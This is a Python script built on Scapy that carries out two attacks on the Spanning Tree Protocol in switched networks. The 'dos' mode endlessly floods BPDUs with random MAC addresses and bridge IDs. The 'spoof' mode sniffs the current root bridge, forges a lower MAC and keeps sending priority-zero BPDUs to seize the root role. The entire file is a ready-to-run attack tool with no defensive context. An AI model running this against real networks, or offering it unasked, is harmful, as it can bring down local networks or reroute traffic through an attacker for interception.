#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from scapy.all import (
Ether,
STP,
LLC,
sendp,
sniff,
RandMAC)
from random import choice
from argparse import ArgumentParser
import sys

mac_dst = '01:80:C2:00:00:00'

def bpdu_dos(iface):
    id_list = []
    for i in range(9):
        id_list.append(i * 4096)

    randmac = RandMAC()
    ether = Ether(dst=mac_dst,src=randmac)/LLC()
    stp = STP(rootid=choice(id_list),rootmac=randmac,bridgeid=choice(id_list),bridgemac=randmac)
    pkt = ether/stp
    sendp(pkt,iface=iface,loop=1)

def bpdu_spoof(iface):
    mac_new = get_rootmac(iface)
    while 1:
        ether = Ether(dst=mac_dst,src=mac_new)/LLC()
        stp = STP(rootid=0,rootmac=mac_new,bridgeid=0,bridgemac=mac_new)
        pkt = ether/stp
        sendp(pkt,iface=iface)

def get_rootmac(iface):
    stp = sniff(stop_filter=lambda x: x.haslayer(STP),iface=iface,timeout=3,count=1)

    if not stp:
        print('[-]No stp packet')
        sys.exit(1)

    mac = stp.res[0].fields['src']
    mac_list = mac.split(':')
    mac_list[3] = hex(int(mac_list[3],16) - 1)[2:]
    mac_new = ':'.join(mac_list)
    return mac_new

def main():
    usage = '%s  [-i interface] [-m mode]'%(sys.argv[0])
    parser = ArgumentParser(usage=usage)
    parser.add_argument('-i','--iface',default='eth0',help='The network interface of use')
    parser.add_argument('-m','--mode',required=True,help='[spoof]:The BPDU Root Roles attack [dos]:The BPDU Dos attack')
    args = parser.parse_args()
    iface = args.iface
    attack = args.mode
    
    try:
        if attack == 'spoof':
            bpdu_spoof(iface)
        elif attack == 'dos':
            bpdu_dos(iface)
        else:
            parser.print_help()

    except KeyboardInterrupt:
        print('\n[+] Stopped sending')
        
    except ValueError:  # 捕获输入参数错误
        parser.print_help()

if __name__ == '__main__':
    main()
